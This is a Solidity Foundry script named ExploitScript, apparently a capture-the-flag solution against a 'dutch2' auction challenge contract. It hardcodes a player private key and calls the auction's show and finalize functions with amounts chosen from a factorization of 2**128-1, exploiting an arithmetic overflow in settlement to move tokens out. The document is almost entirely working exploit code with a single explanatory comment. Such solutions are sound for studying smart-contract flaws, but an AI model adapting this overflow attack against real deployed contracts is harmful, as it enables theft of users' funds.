// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import {Script, console} from "forge-std/Script.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {Token} from "../../src/dutch2/Token.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {AuctionManager} from "../../src/dutch2/AuctionManager.sol";
import {Challenge} from "../../src/dutch2/Challenge.sol";
import {Math} from "../../src/dutch2/util/Math.sol";

contract ExploitScript is Script {
    address player;
    address player2;
    uint256 playerPrivateKey;
    uint256 player2PrivateKey;
    ERC20 quoteToken;
    ERC20 baseToken;
    AuctionManager auction;
    Challenge challenge;

    function setUp() public {
        challenge = Challenge(
            address(0x46389B936c3d394F42A348C7C367F9e009c26Dd1)
        );
        playerPrivateKey = 0x20cb8798fa82769e11266c42d93f6b66a37d7231d78101c4a8c114e8101ada34;
        player = vm.addr(playerPrivateKey);
        player2PrivateKey = 0x4567;
        player2 = vm.addr(player2PrivateKey);
        auction = challenge.auction();
        baseToken = challenge.baseToken();
        quoteToken = challenge.quoteToken();
    }

    function run() public {
        // factorization of 2**128-1 = totalBase * totalQuote
        uint128 amountBase = 92826887214783219843; // around 92e18
        uint128 amountQuote = 3665773755114633685; // around 3.66e18
        uint256 aid = 1;

        vm.startBroadcast(playerPrivateKey);
        auction.show(aid, 0x1, new bytes(0));
        uint256[] memory indices = new uint256[](2);
        indices[0] = 0;
        indices[1] = 1;
        auction.finalize(aid, indices, amountBase, type(uint128).max);
        console.log("Player base token balance:", baseToken.balanceOf(player));
        console.log(
            "Auction base token balance:",
            baseToken.balanceOf(address(auction))
        );
        baseToken.transfer(address(auction), baseToken.balanceOf(player));
        quoteToken.transfer(address(auction), amountQuote * 2 - 1e10);
        auction.finalize(aid, indices, amountBase, type(uint128).max);
        vm.stopBroadcast();
    }
}
